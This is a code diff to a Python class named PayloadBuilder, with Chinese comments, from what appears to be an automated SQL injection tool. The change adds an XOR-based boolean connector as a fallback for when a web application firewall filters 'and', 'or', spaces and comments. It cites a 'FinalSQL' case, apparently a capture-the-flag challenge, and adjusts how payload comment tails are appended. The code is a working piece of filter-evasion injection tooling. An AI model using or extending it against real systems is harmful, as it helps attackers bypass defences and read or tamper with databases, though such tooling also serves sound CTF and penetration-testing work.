@@ -26,7 +26,7 @@ class PayloadBuilder:
         return "'" + s.replace("'", "''") + "'"
 
     def logic_and(self, cond: str) -> str:
-        """拼接布尔条件，and 被过滤时依次尝试 &&/or。"""
+        """拼接布尔条件，and 被过滤时依次尝试 &&/or/^。"""
         cond = f"({cond})"
         if not self.waf.is_filtered("and"):
             return f" and {cond}"
@@ -34,10 +34,10 @@ class PayloadBuilder:
             return f"&&{cond}"
         if not self.waf.is_filtered("or"):
             return f" or {cond}"
-        return f"^{cond}"
+        return self.logic_xor(cond)
 
     def logic_or(self, cond: str) -> str:
-        """or 连接（登录框恒真语义）；or 被过滤时降级 || / and。"""
+        """or 连接（登录框恒真语义）；or 被过滤时降级 || / and / ^。"""
         cond = f"({cond})"
         if not self.waf.is_filtered("or"):
             return f" or {cond}"
@@ -45,7 +45,12 @@ class PayloadBuilder:
             return f"||{cond}"
         if not self.waf.is_filtered("and"):
             return f" and {cond}"
-        return f"^{cond}"
+        return self.logic_xor(cond)
+
+    def logic_xor(self, cond: str) -> str:
+        """异或连接（FinalSQL 类：and/or/空格/注释全被滤）。
+        数字型 1^(cond)：真→0（无行），假→保持基线值。^ 无需空格分隔。"""
+        return f"^({cond})"
 
     # ------------------------------------------------------------------ transform
     def transform(self, sql: str) -> str:
@@ -80,7 +85,7 @@ class PayloadBuilder:
             core_t = self.transform(core)
             if core_t[:1].isalpha() or core_t[:1] == ";":
                 pre += form_sep(form)
-        tail = self.inj.comment if self.inj.comment != "quote-close" else ""
+        tail = self.inj.comment if self.inj.comment not in ("quote-close", "none") else ""
         return pre + self.transform(core) + tail
 
     def union_row(self, exprs: list) -> str:
